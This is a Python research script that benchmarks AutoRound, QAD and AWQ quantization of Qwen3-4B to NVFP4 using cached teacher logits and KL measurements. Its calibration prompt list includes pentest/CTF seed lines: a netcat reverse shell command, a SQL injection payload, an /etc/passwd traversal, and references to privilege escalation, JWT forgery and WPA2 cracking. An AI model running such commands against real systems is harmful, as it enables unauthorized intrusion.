"""
Combined Experiment — PRODUCTION (Qwen3-4B on RTX 5090, 32 GB)

Goal: validate the AR-vs-QAD-vs-AWQ ordering at production scale (4B params,
larger calibration set, longer sweeps) within a single 32 GB GPU budget.

VRAM strategy (Option B from the design discussion):
  Qwen3-4B BF16 weights      ~  8 GB
  + grads + AdamW state      ~ 32 GB at fp32 → too tight for teacher+student
  Tricks applied to fit:
    1. Logit caching         — teacher forward runs ONCE, logits saved to disk;
                               teacher is freed before any student touches VRAM
    2. 8-bit AdamW (bnb)     — optimizer state ~75% smaller (24GB → 6GB)
    3. Gradient checkpointing — activations recomputed during backward
                               (~25% slower but ~6 GB activation memory saved)

Net effect: every method (AR, AWQ, QAD) loads exactly ONE model at a time.
QAD reads cached teacher logits from disk instead of running a live teacher.

Cache layout (per-model, per-calibration-set isolation):
  runs/cache_<model_hash>_<calib_hash>/
    teacher_logits_000.pt       (input_ids + bf16 logits per sequence)
    teacher_logits_001.pt
    ...
    cache_meta.json             (hashes, prompts, gen settings — for invalidation)

Results layout:
  runs/results_<timestamp>/
    results.json                (full per-run records)
    summary.csv                 (sortable table for downstream analysis)

Tunable knobs at the top of this file: NUM_PROMPTS, MAX_NEW_TOKENS, sweeps.
"""

import copy
import csv
import hashlib
import json
import os
import time
from datetime import datetime
from pathlib import Path

import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM

import modelopt.torch.quantization as mtq
from auto_round import AutoRound

# 8-bit AdamW comes from bitsandbytes — saves ~75% optimizer state memory
# vs torch.optim.AdamW with negligible accuracy impact (Dettmers et al.)
from bitsandbytes.optim import AdamW8bit

# ── CONFIG ────────────────────────────────────────────────────────────────────

MODEL_NAME     = "Qwen/Qwen3-4B-Instruct-2507"
DEVICE         = "cuda" if torch.cuda.is_available() else "cpu"
SEED           = 42

# Calibration size: bigger than mental_model (8 × 80) — gives QAD more gradient
# diversity. ~32 × 256 ≈ 8 K tokens, which fits ~2.5 GB of cached logits at
# vocab=152k. Adjust down if disk-tight.
NUM_PROMPTS    = 32
MAX_NEW_TOKENS = 256

# Shared inference/measurement settings
TEMPERATURE    = 2.0
BITS           = 4
GROUP_SIZE     = 16

# NVFP4: ModelOpt's canonical W4A4 recipe.
NVFP4_CFG = mtq.NVFP4_DEFAULT_CFG

# Output directories — timestamped run, hashed cache (so different prompts
# or models don't collide).
RUN_TS      = datetime.now().strftime("%Y%m%d_%H%M%S")
RUNS_ROOT   = Path("runs")
RESULTS_DIR = RUNS_ROOT / f"results_{RUN_TS}"
RESULTS_DIR.mkdir(parents=True, exist_ok=True)

# ── PROMPTS ───────────────────────────────────────────────────────────────────
# Mix of in-domain (pentest CTF) + general text so QAD's distribution-matching
# doesn't overfit to one style. The pentest set is the same as combined_experiment.py;
# the rest add general code/reasoning/dialog so the cache covers more activation
# patterns AWQ's per-channel scaling needs.

PROMPTS = [
    # Pentest / CTF (in-domain for the agent)
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
    "Found a sudo entry allowing /usr/bin/find without password. The escalation path is",
    "The web app sets a JWT cookie with alg=HS256. To forge an admin token we",
    "Open SMB share \\\\10.0.0.7\\public allows anonymous browsing. Useful files include",
    "WPA2 handshake captured to handshake.cap. Cracking with hashcat:",
    # General reasoning / dialog (out-of-domain for diversity)
    "Explain the difference between TCP and UDP in two sentences.",
    "Write a Python function that returns the n-th Fibonacci number using memoization.",
    "Translate to French: 'The quick brown fox jumps over the lazy dog.'",
    "Summarize the key idea of the transformer architecture for a junior engineer.",
    "What are three trade-offs between a SQL database and a document store?",
    "Given a list of integers, write Python to return only the even ones in order.",
    "Explain prompt caching in large language models in three bullet points.",
    "What is the difference between bfloat16 and float16 for training?",
    "List five reasons a unit test might be flaky.",
    "Write a regex that matches an IPv4 address in dotted form.",
    "Compare A/B testing and multi-armed bandit experimentation in one paragraph.",
    "What is gradient checkpointing and when should you use it?",
    # Code / engineering
    "In a React functional component, how do you avoid re-rendering when a parent updates?",
    "Why does Python's GIL prevent true parallelism for CPU-bound threads?",
    "Sketch a SQL query that returns the top 5 customers by total purchase amount.",
    "What does `git rebase --interactive` allow that a normal merge does not?",
    "Explain the CAP theorem with one example for each pairing.",
    # Math / structured reasoning
    "If a fair die is rolled three times, what is the probability of at least one six?",
    "Solve: 3x + 7 = 22. Show your steps.",
    "List the first ten prime numbers.",
]
assert len(PROMPTS) >= NUM_PROMPTS, f"Need at least {NUM_PROMPTS} prompts"
PROMPTS = PROMPTS[:NUM_PROMPTS]

# ── SWEEP CONFIGS ─────────────────────────────────────────────────────────────
# Tuned for ~4-6 hour total runtime on a single 5090. Dial down ITERS/STEPS to
# shorten; dial up to chase the last few % recovered.

AR_SWEEP = [
    {"iters": 100, "seqlen": 128},   # mental-model sweet spot — verify it holds at 4B
    {"iters": 200, "seqlen": 128},
    {"iters": 500, "seqlen": 128},   # paper default
    {"iters": 1000, "seqlen": 128},  # extra headroom check
]

QAD_SWEEP = [
    # (steps, lr, temperature) — at 0.6B, T=4.0 + more steps was the winner.
    # At 4B with cached teacher, push steps higher to give gradient-based QAD
    # the budget it needs to actually exercise its headroom advantage.
    {"steps":  500, "lr": 1e-5, "temperature": 4.0},
    {"steps": 1000, "lr": 1e-5, "temperature": 4.0},
    {"steps": 2000, "lr": 5e-6, "temperature": 4.0},
    {"steps": 2000, "lr": 1e-5, "temperature": 2.0},
    {"steps": 5000, "lr": 5e-6, "temperature": 4.0},   # long-run candidate
]

AWQ_SWEEP = [
    {"algorithm": "awq_lite"},
    {"algorithm": "awq_clip"},
    {"algorithm": "awq_full"},
]

# ── TOKENIZER (light, always loaded) ──────────────────────────────────────────

print(f"=== Production Combined Experiment ===")
print(f"Model     : {MODEL_NAME}")
print(f"Device    : {DEVICE}")
print(f"Run dir   : {RESULTS_DIR}")
print(f"Calib     : {NUM_PROMPTS} prompts × ~{MAX_NEW_TOKENS} tokens\n")

torch.manual_seed(SEED)
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token

VOCAB_SIZE = len(tokenizer)


# ── MODEL LOADING ─────────────────────────────────────────────────────────────

def load_bf16(grad_ckpt: bool = False) -> torch.nn.Module:
    """
    BF16 base model. grad_ckpt=True trades ~25% wall-clock for activation memory
    by recomputing activations during backward (HF built-in).

    Note: gradient checkpointing requires use_cache=False — they conflict because
    HF's KV cache assumes activations are kept around.
    """
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME,
        dtype=torch.bfloat16,
        device_map=DEVICE,
    )
    if grad_ckpt:
        model.config.use_cache = False
        model.gradient_checkpointing_enable()
    return model


def load_nvfp4(
    calibration_data: list[torch.Tensor],
    cfg: dict | None = None,
    grad_ckpt: bool = False,
) -> torch.nn.Module:
    """
    NVFP4 model via ModelOpt fake quantization + STE.
    cfg defaults to NVFP4_DEFAULT_CFG (RTN/max calibration); pass an AWQ
    variant cfg to swap the calibration algorithm.
    """
    cfg = cfg if cfg is not None else NVFP4_CFG
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME,
        dtype=torch.bfloat16,
        device_map=DEVICE,
    )

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=cfg, forward_loop=calibration_forward)

    if grad_ckpt:
        model.config.use_cache = False
        model.gradient_checkpointing_enable()
    return model


# ── CALIBRATION DATA ──────────────────────────────────────────────────────────

def generate_calibration_data(
    teacher: torch.nn.Module,
    prompts: list[str],
    max_new_tokens: int,
) -> list[torch.Tensor]:
    """Teacher-generated sequences. No labels needed (QAD/AR/AWQ all unsupervised)."""
    sequences = []
    print("Generating calibration data from teacher...")
    for i, prompt in enumerate(prompts, 1):
        input_ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            output = teacher.generate(
                input_ids,
                max_new_tokens=max_new_tokens,
                do_sample=True,
                temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(output)
        print(f"  [{i:>2}/{len(prompts)}] {output.shape[1]:>4} tokens")
    print()
    return sequences


# ── LOGIT CACHING (the key production trick) ──────────────────────────────────

def _hash_prompts(prompts: list[str], max_new_tokens: int) -> str:
    """Stable short hash so re-running with same prompts hits the cache."""
    h = hashlib.sha256()
    h.update(MODEL_NAME.encode())
    h.update(str(max_new_tokens).encode())
    for p in prompts:
        h.update(p.encode())
    return h.hexdigest()[:12]


def cache_teacher_logits(
    calibration_data: list[torch.Tensor],
    cache_dir: Path,
) -> Path:
    """
    Phase A — run the teacher ONCE, write per-sequence (input_ids, logits) to disk
    in bf16 to keep cache size manageable, then free the teacher from VRAM.

    All downstream methods (AR, AWQ, QAD, KL measurement) read from this cache,
    so the teacher never has to coexist with a student in memory.
    """
    cache_dir.mkdir(parents=True, exist_ok=True)
    meta_path = cache_dir / "cache_meta.json"

    # Cache hit? Check that all expected files exist.
    if meta_path.exists():
        meta = json.loads(meta_path.read_text())
        if meta.get("num_seqs") == len(calibration_data):
            all_present = all(
                (cache_dir / f"teacher_logits_{i:03d}.pt").exists()
                for i in range(len(calibration_data))
            )
            if all_present:
                print(f"[cache] hit — reusing {cache_dir}\n")
                return cache_dir

    print(f"[cache] miss — building cache at {cache_dir}")
    print(f"[cache] loading teacher (BF16)...")
    teacher = load_bf16(grad_ckpt=False)
    teacher.eval()

    print(f"[cache] running teacher forward over {len(calibration_data)} sequences...")
    t0 = time.perf_counter()
    for i, seq in enumerate(calibration_data):
        with torch.no_grad():
            logits = teacher(input_ids=seq).logits  # (1, T, V) in bf16
        # Save bf16 to keep cache small. KL still computed in fp32 at use time.
        torch.save(
            {
                "input_ids": seq.cpu(),
                "logits":    logits.to(torch.bfloat16).cpu(),
            },
            cache_dir / f"teacher_logits_{i:03d}.pt",
        )
        if (i + 1) % 8 == 0 or i == len(calibration_data) - 1:
            print(f"[cache]   cached {i+1}/{len(calibration_data)}")
    elapsed = time.perf_counter() - t0

    # Compute total cache size on disk
    total_mb = sum(
        (cache_dir / f"teacher_logits_{i:03d}.pt").stat().st_size
        for i in range(len(calibration_data))
    ) / (1024 ** 2)

    meta_path.write_text(json.dumps({
        "model":        MODEL_NAME,
        "num_seqs":     len(calibration_data),
        "vocab_size":   VOCAB_SIZE,
        "elapsed_sec":  round(elapsed, 1),
        "cache_mb":     round(total_mb, 1),
        "max_new_tok":  MAX_NEW_TOKENS,
    }, indent=2))

    print(f"[cache] done — {len(calibration_data)} seqs, {total_mb:.1f} MB, {elapsed:.1f}s")
    print(f"[cache] freeing teacher from VRAM\n")
    del teacher
    torch.cuda.empty_cache()
    return cache_dir


def load_cached(cache_dir: Path, idx: int) -> tuple[torch.Tensor, torch.Tensor]:
    """Load one cached (input_ids, logits) pair → GPU. Logits promoted to fp32 for KL."""
    blob = torch.load(cache_dir / f"teacher_logits_{idx:03d}.pt", weights_only=True)
    input_ids = blob["input_ids"].to(DEVICE)
    logits    = blob["logits"].to(DEVICE).float()  # fp32 for stable KL math
    return input_ids, logits


# ── KL MEASUREMENT (cached teacher) ───────────────────────────────────────────

def measure_kl_cached(
    student: torch.nn.Module,
    cache_dir: Path,
    num_seqs: int,
    temperature: float,
    label: str = "",
) -> float:
    """
    Per-sequence KL(teacher || student) using cached teacher logits.
    Identical math to combined_experiment.py's measure_kl, but reads
    teacher logits from disk instead of running a live teacher forward.
    """
    student.eval()
    total = 0.0
    with torch.no_grad():
        for i in range(num_seqs):
            input_ids, t_logits = load_cached(cache_dir, i)
            s_logits = student(input_ids=input_ids).logits.clamp(-100, 100)
            t_logits = t_logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(s_logits / temperature, dim=-1),
                F.softmax(t_logits  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total += kl.item()
    avg = total / num_seqs
    if label:
        print(f"  {label:<58} KL = {avg:.4f}")
    return avg


# ── AUTOROUND ─────────────────────────────────────────────────────────────────

def run_autoround(
    model: torch.nn.Module,
    iters: int,
    calibration_data: list[torch.Tensor],
    seqlen: int,
) -> None:
    """AutoRound on NVFP4 grid (data_type='nv_fp4')."""
    cal_texts = [
        tokenizer.decode(seq[0], skip_special_tokens=True)
        for seq in calibration_data
    ]
    autoround = AutoRound(
        model=model,
        tokenizer=tokenizer,
        bits=BITS,
        group_size=GROUP_SIZE,
        iters=iters,
        dataset=cal_texts,
        seqlen=seqlen,
        data_type="nv_fp4",
        device_map=DEVICE,
    )
    autoround.quantize()
    model.to(DEVICE)


# ── AWQ ───────────────────────────────────────────────────────────────────────

def run_awq(
    model: torch.nn.Module,
    algorithm: str,
    calibration_data: list[torch.Tensor],
) -> None:
    """ModelOpt NVFP4 quantization with AWQ algorithm variant. No backprop."""
    cfg = copy.deepcopy(NVFP4_CFG)
    cfg["algorithm"] = algorithm

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=cfg, forward_loop=calibration_forward)
    model.eval()


# ── QAD (cached teacher + 8-bit AdamW + grad checkpointing) ───────────────────

def run_qad_cached(
    student: torch.nn.Module,
    cache_dir: Path,
    num_seqs: int,
    steps: int,
    lr: float,
    temperature: float,
) -> None:
    """
    QAD with the teacher served from disk-cached logits.

    Differences from the in-VRAM version:
      - No teacher.forward() — read cached logits per step.
      - 8-bit AdamW (bnb) — optimizer state ~4x smaller than fp32 AdamW.
      - Gradient checkpointing — student activations recomputed during backward.

    These three together drop QAD's 4B working set from ~64 GB → ~24 GB,
    fitting on a single 5090.
    """
    student.train()
    optimizer = AdamW8bit(student.parameters(), lr=lr)

    print(f"    [qad] steps={steps}  lr={lr}  T={temperature}")
    for step in range(steps):
        idx = step % num_seqs
        input_ids, t_logits = load_cached(cache_dir, idx)

        s_logits = student(input_ids=input_ids).logits
        s_logits = s_logits.clamp(-100, 100)
        t_logits = t_logits.clamp(-100, 100)

        kl = F.kl_div(
            F.log_softmax(s_logits / temperature, dim=-1),
            F.softmax(t_logits  / temperature, dim=-1),
            reduction="batchmean",
        ) * (temperature ** 2)

        if torch.isnan(kl):
            print(f"    [qad] step={step} kl=nan — stopping (gradient instability)")
            break

        optimizer.zero_grad()
        kl.backward()
        torch.nn.utils.clip_grad_norm_(student.parameters(), max_norm=1.0)
        optimizer.step()

        if step % max(1, steps // 20) == 0 or step == steps - 1:
            print(f"    [qad] step={step:>5}  kl={kl.item():.4f}")


# ── RESULTS WRITER ────────────────────────────────────────────────────────────

def write_results(records: list[dict]) -> None:
    """Persist results as JSON (full) and CSV (sortable summary)."""
    json_path = RESULTS_DIR / "results.json"
    csv_path  = RESULTS_DIR / "summary.csv"

    json_path.write_text(json.dumps(records, indent=2))

    fields = ["method", "label", "post_kl", "pct_recovered", "elapsed_sec", "config"]
    with csv_path.open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=fields)
        w.writeheader()
        for r in records:
            row = {k: r.get(k) for k in fields}
            row["config"] = json.dumps(r.get("config", {}))
            w.writerow(row)

    print(f"\n[results] wrote {json_path}")
    print(f"[results] wrote {csv_path}")


# ── MAIN ──────────────────────────────────────────────────────────────────────

def main():
    records: list[dict] = []

    # ── Step 1: calibration data + teacher logit cache ────────────────────────
    print("=== Step 1: Calibration data + teacher logit cache ===")
    cache_hash = _hash_prompts(PROMPTS, MAX_NEW_TOKENS)
    cache_dir  = RUNS_ROOT / f"cache_{MODEL_NAME.split('/')[-1]}_{cache_hash}"

    # Teacher load is also where calibration sequences are generated — we have
    # to keep these in VRAM long enough to run generation, then save them.
    # If cache already exists, we skip teacher load entirely.
    cal_path = cache_dir / "calibration_inputs.pt"
    if cal_path.exists() and (cache_dir / "cache_meta.json").exists():
        print(f"[cache] loading saved calibration sequences from {cal_path}")
        calibration_data = [t.to(DEVICE) for t in torch.load(cal_path, weights_only=True)]
        cache_teacher_logits(calibration_data, cache_dir)  # no-op on hit
    else:
        cache_dir.mkdir(parents=True, exist_ok=True)
        teacher = load_bf16(grad_ckpt=False)
        calibration_data = generate_calibration_data(teacher, PROMPTS, MAX_NEW_TOKENS)
        torch.save([s.cpu() for s in calibration_data], cal_path)
        del teacher
        torch.cuda.empty_cache()
        cache_teacher_logits(calibration_data, cache_dir)

    num_seqs = len(calibration_data)

    # ── Step 2: oracle KL (teacher vs teacher = cached vs cached) ─────────────
    # We don't actually need a forward pass — KL of cached logits against
    # themselves is computed directly. Should be ~0 within numerical noise.
    print("\n=== Step 2: Oracle KL (cached teacher vs cached teacher) ===")
    total = 0.0
    for i in range(num_seqs):
        _, t_logits = load_cached(cache_dir, i)
        t_logits = t_logits.clamp(-100, 100)
        kl = F.kl_div(
            F.log_softmax(t_logits / TEMPERATURE, dim=-1),
            F.softmax(t_logits  / TEMPERATURE, dim=-1),
            reduction="batchmean",
        ) * (TEMPERATURE ** 2)
        total += kl.item()
    kl_oracle = total / num_seqs
    print(f"  Oracle KL (BF16 vs BF16 cached) = {kl_oracle:.4f}\n")

    # ── Step 3: shared NVFP4-RTN baseline ─────────────────────────────────────
    print("=== Step 3: Shared NVFP4-RTN baseline (algorithm='max', no training) ===")
    rtn_model = load_nvfp4(calibration_data, cfg=NVFP4_CFG, grad_ckpt=False)
    kl_rtn = measure_kl_cached(rtn_model, cache_dir, num_seqs, TEMPERATURE,
                                "Shared RTN — NVFP4 (no opt)")
    total_gap = kl_rtn - kl_oracle
    del rtn_model
    torch.cuda.empty_cache()
    print(f"  Total gap = {total_gap:.4f}\n")

    def pct(post_kl: float) -> float:
        return (kl_rtn - post_kl) / total_gap * 100 if total_gap > 0 else 0.0

    # ── Step 4: AR sweep ──────────────────────────────────────────────────────
    print("=== Step 4: AutoRound sweep ===")
    for cfg in AR_SWEEP:
        label = f"AR  iters={cfg['iters']} seqlen={cfg['seqlen']}"
        print(f"\n  [{label}]")
        model = load_bf16(grad_ckpt=False)
        t0 = time.perf_counter()
        run_autoround(model, iters=cfg["iters"],
                      calibration_data=calibration_data, seqlen=cfg["seqlen"])
        elapsed = time.perf_counter() - t0
        post_kl = measure_kl_cached(model, cache_dir, num_seqs, TEMPERATURE,
                                     f"  post: {label}")
        recovered = pct(post_kl)
        print(f"  → {recovered:.1f}% recovered  {elapsed:.1f}s")
        records.append({
            "method":         "AR",
            "label":          label,
            "post_kl":        round(post_kl, 4),
            "pct_recovered":  round(recovered, 2),
            "elapsed_sec":    round(elapsed, 1),
            "config":         cfg,
        })
        del model
        torch.cuda.empty_cache()
        # Persist after each run so a crash mid-sweep still leaves usable data
        write_results(records)

    # ── Step 5: AWQ sweep ─────────────────────────────────────────────────────
    print("\n=== Step 5: AWQ sweep ===")
    for cfg in AWQ_SWEEP:
        label = f"AWQ {cfg['algorithm']}"
        print(f"\n  [{label}]")
        model = load_bf16(grad_ckpt=False)
        t0 = time.perf_counter()
        run_awq(model, algorithm=cfg["algorithm"], calibration_data=calibration_data)
        elapsed = time.perf_counter() - t0
        post_kl = measure_kl_cached(model, cache_dir, num_seqs, TEMPERATURE,
                                     f"  post: {label}")
        recovered = pct(post_kl)
        print(f"  → {recovered:.1f}% recovered  {elapsed:.1f}s")
        records.append({
            "method":         "AWQ",
            "label":          label,
            "post_kl":        round(post_kl, 4),
            "pct_recovered":  round(recovered, 2),
            "elapsed_sec":    round(elapsed, 1),
            "config":         cfg,
        })
        del model
        torch.cuda.empty_cache()
        write_results(records)

    # ── Step 6: QAD sweep (cached teacher, 8-bit AdamW, grad ckpt) ────────────
    print("\n=== Step 6: QAD sweep (cached teacher + 8-bit AdamW + grad ckpt) ===")
    for cfg in QAD_SWEEP:
        label = f"QAD steps={cfg['steps']} lr={cfg['lr']} T={cfg['temperature']}"
        print(f"\n  [{label}]")
        student = load_nvfp4(calibration_data, cfg=NVFP4_CFG, grad_ckpt=True)
        t0 = time.perf_counter()
        run_qad_cached(
            student=student,
            cache_dir=cache_dir,
            num_seqs=num_seqs,
            steps=cfg["steps"],
            lr=cfg["lr"],
            temperature=cfg["temperature"],
        )
        elapsed = time.perf_counter() - t0
        post_kl = measure_kl_cached(student, cache_dir, num_seqs, TEMPERATURE,
                                     f"  post: {label}")
        recovered = pct(post_kl)
        print(f"  → {recovered:.1f}% recovered  {elapsed:.1f}s")
        records.append({
            "method":         "QAD",
            "label":          label,
            "post_kl":        round(post_kl, 4),
            "pct_recovered":  round(recovered, 2),
            "elapsed_sec":    round(elapsed, 1),
            "config":         cfg,
        })
        del student
        torch.cuda.empty_cache()
        write_results(records)

    # ── Step 7: final summary ─────────────────────────────────────────────────
    records.sort(key=lambda r: (-r["pct_recovered"], r["elapsed_sec"]))

    print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║       AR vs QAD vs AWQ on NVFP4 — PRODUCTION ({MODEL_NAME.split('/')[-1]})       ║
╚══════════════════════════════════════════════════════════════════════════════╝

  Oracle KL  : {kl_oracle:.4f}  (BF16 cached vs cached — shared target)
  RTN KL     : {kl_rtn:.4f}  (NVFP4 round-to-nearest — shared baseline)
  Total gap  : {total_gap:.4f}

  % recovered = (RTN_KL − Post_KL) / (RTN_KL − Oracle_KL)

 {"Method":<36}  {"Post KL":>8}  {"% Recovered":>12}  {"Time(s)":>9}
{"─" * 72}""")

    prev_method = None
    for r in records:
        if prev_method and prev_method != r["method"]:
            print()
        print(f"  {r['label']:<36}  "
              f"{r['post_kl']:>8.4f}  "
              f"{r['pct_recovered']:>11.1f}%  "
              f"{r['elapsed_sec']:>8.1f}s")
        prev_method = r["method"]

    print(f"""
{"─" * 72}
Config : model={MODEL_NAME}  bits={BITS}  group_size={GROUP_SIZE}  T={TEMPERATURE}
         calib={NUM_PROMPTS} prompts × ~{MAX_NEW_TOKENS} tokens
         tricks=logit_caching + 8bit_adamw + grad_checkpointing

Cache dir   : {cache_dir}
Results dir : {RESULTS_DIR}
""")

    write_results(records)


if __name__ == "__main__":
    main()
